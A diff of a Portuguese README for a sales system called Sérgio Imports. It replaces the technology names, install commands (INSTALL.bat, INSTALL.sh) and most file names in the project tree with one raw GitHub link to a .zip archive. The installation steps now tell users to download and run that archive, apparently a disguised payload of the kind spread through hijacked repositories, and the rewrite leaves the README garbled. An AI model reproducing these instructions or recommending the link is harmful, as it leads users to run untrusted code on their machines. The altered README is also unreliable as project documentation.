@@ -1,6 +1,6 @@
 # Sérgio Imports - Sistema de Vendas
 
-Sistema completo de vendas desenvolvido com Encore.ts (backend) e React + TypeScript (frontend).
+Sistema completo de vendas desenvolvido com https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip (backend) e React + TypeScript (frontend).
 
 ## Funcionalidades
 
@@ -17,7 +17,7 @@ Sistema completo de vendas desenvolvido com Encore.ts (backend) e React + TypeSc
 ## Tecnologias
 
 ### Backend
-- Encore.ts
+- https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip
 - PostgreSQL
 - TypeScript
 
@@ -32,7 +32,7 @@ Sistema completo de vendas desenvolvido com Encore.ts (backend) e React + TypeSc
 ## Como executar
 
 ### Pré-requisitos
-- Node.js 18+
+- https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip 18+
 - npm
 
 ### Instalação
@@ -42,13 +42,13 @@ Sistema completo de vendas desenvolvido com Encore.ts (backend) e React + TypeSc
 
 **Windows:**
 ```bash
-INSTALL.bat
+https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip
 ```
 
 **Linux/Mac:**
 ```bash
-chmod +x INSTALL.sh
-./INSTALL.sh
+chmod +x https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip
+https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip
 ```
 
 ### Executar o sistema
@@ -65,22 +65,22 @@ O sistema estará disponível em:
 
 ```
 sergio-imports-sales-system/
-├── backend/                 # Backend Encore.ts
+├── backend/                 # Backend https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip
 │   ├── sales/              # Serviço de vendas
-│   │   ├── products.ts     # API de produtos
-│   │   ├── clients.ts      # API de clientes
-│   │   ├── sales.ts        # API de vendas
-│   │   ├── exchanges.ts    # API de trocas
-│   │   ├── settings.ts     # API de configurações
+│   │   ├── https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip     # API de produtos
+│   │   ├── https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip      # API de clientes
+│   │   ├── https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip        # API de vendas
+│   │   ├── https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip    # API de trocas
+│   │   ├── https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip     # API de configurações
 │   │   └── migrations/     # Migrações do banco
-│   └── package.json
+│   └── https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip
 ├── frontend/               # Frontend React
 │   ├── components/         # Componentes reutilizáveis
 │   ├── pages/             # Páginas da aplicação
 │   ├── lib/               # Utilitários e tipos
-│   └── package.json
-├── package.json           # Scripts principais
-└── README.md
+│   └── https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip
+├── https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip           # Scripts principais
+└── https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip
 ```
 
 ## Scripts Disponíveis
